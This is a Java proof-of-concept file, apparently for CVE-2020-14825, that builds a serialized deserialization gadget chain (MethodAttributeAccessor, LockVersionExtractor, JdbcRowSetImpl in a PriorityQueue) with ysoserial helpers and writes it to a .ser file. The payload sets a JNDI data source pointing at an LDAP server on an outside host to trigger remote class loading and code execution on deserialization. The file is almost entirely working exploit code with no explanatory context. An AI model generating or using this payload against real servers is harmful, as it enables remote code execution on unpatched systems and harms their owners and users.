import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import ysoserial.payloads.util.Reflections;

import java.io.*;
import java.util.PriorityQueue;

public class CVE_2020_14825 {
    public static void main(String[] args) throws Exception {
        MethodAttributeAccessor accessor = new MethodAttributeAccessor();
        accessor.setAttributeName("Timeline Sec");
        accessor.setIsWriteOnly(true);
        accessor.setGetMethodName("getDatabaseMetaData");

        LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");

        JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
        jdbcRowSet.setDataSourceName("ldap://192.168.247.128:1389/#Poc");

        PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
        Reflections.setFieldValue(queue,"size",2);

        Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
        queueArray[0] = jdbcRowSet;

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File("cve_2020_14825.ser")));
        out.writeObject(queue);
        out.flush();
        out.close();
//        readObject();
    }

    public static void readObject() {
        FileInputStream fis = null;
        try {
            fis = new FileInputStream("F:\\java-test\\Mytest\\cve_2020_14825.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
